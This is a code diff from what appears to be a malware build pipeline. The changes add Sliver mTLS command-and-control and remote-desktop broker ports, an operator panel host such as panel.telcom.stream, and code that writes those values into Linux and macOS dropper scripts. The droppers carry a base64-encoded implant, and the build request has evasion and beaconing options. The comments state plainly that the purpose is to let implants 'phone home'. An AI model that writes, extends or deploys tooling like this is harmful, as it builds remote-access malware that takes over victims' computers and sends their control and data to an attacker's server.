@@ -42,6 +42,21 @@ TARGETS: list[tuple[str, str]] = [
 
 ALPHABET = string.ascii_lowercase + string.digits
 
+# Operator panel endpoints baked into installers so the implant always knows
+# where to phone home.
+C2_PORT = 8888   # Sliver mTLS C2 port
+RD_PORT = 8443   # RD broker port for screen/input
+
+
+def panel_host(config: Settings) -> str:
+    """Public host of the operator panel (e.g. panel.telcom.stream)."""
+    return config.public_host or "127.0.0.1"
+
+
+def panel_c2_url(config: Settings) -> str:
+    """C2 URL for implant payloads (e.g. panel.telcom.stream:8888)."""
+    return f"{config.public_host or '127.0.0.1'}:{C2_PORT}"
+
 
 def _read_bin(path: Path) -> bytes:
     """Read a pre-built helper binary if present; empty otherwise (degrades
@@ -182,13 +197,23 @@ def render_windows(
     )
 
 
-def render_linux(doc: str, suffix: str, implant_bytes: bytes) -> str:
+def render_linux(
+    doc: str,
+    suffix: str,
+    implant_bytes: bytes,
+    panel_host: str = "{{PANEL_HOST}}",
+    panel_c2_port: str = "{{PANEL_C2_PORT}}",
+    panel_rd_port: str = "{{PANEL_RD_PORT}}",
+) -> str:
     template = (TEMPLATES / "linux" / "dropper.sh.tmpl").read_text(encoding="utf-8")
     return (
         template.replace("{{DOC}}", doc)
         .replace("{{UNIT}}", f"fleet-{suffix}")
         .replace("{{BIN_NAME}}", f".fleet-{suffix}")
         .replace("{{IMPLANT_B64}}", base64.b64encode(implant_bytes).decode())
+        .replace("{{PANEL_HOST}}", panel_host)
+        .replace("{{PANEL_C2_PORT}}", panel_c2_port)
+        .replace("{{PANEL_RD_PORT}}", panel_rd_port)
     )
 
 
@@ -293,6 +318,13 @@ class BuildPipeline:
     def _build_linux(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
         implant = self._generate("linux", arch, "executable", req)
         source = render_linux(req.naming["linux"], self._current_suffix, implant)
+        # Inject operator panel host/ports so the implant can reach home
+        source = (
+            source
+            .replace("{{PANEL_HOST}}", panel_host(self.config))
+            .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
+            .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
+        )
         dropper = workdir / "install.sh"
         dropper.write_text(source, encoding="utf-8")
         dropper.chmod(0o755)
@@ -318,6 +350,9 @@ class BuildPipeline:
         template = (TEMPLATES / "mac" / "dropper.command.tmpl").read_text(encoding="utf-8")
         source = (
             template.replace("{{DOC}}", doc)
+            .replace("{{PANEL_HOST}}", panel_host(self.config))
+            .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
+            .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
             .replace("{{IMPLANT_B64}}", base64.b64encode(implant).decode())
             .replace(
                 "{{INSTALL_DAEMON_B64}}",
@@ -419,10 +454,11 @@ class BuildPipeline:
 
 def load_build_request(form: dict[str, str], config: Settings) -> BuildRequest:
     base_url = form.get("base_url") or f"http://{config.public_host}"
+    c2_url = form.get("c2_url") or f"{config.public_host}:{C2_PORT}"
     return BuildRequest(
         doc_name=form.get("doc_name") or config.document_name,
         transport=form.get("transport") or "mtls",
-        c2_url=form.get("c2_url") or "",
+        c2_url=c2_url,
         evasion=form.get("evasion", "1") not in {"0", "false", "no"},
         beacon=form.get("beacon", "0") not in {"0", "false", "no"},
         interval=int(form.get("interval") or "60"),
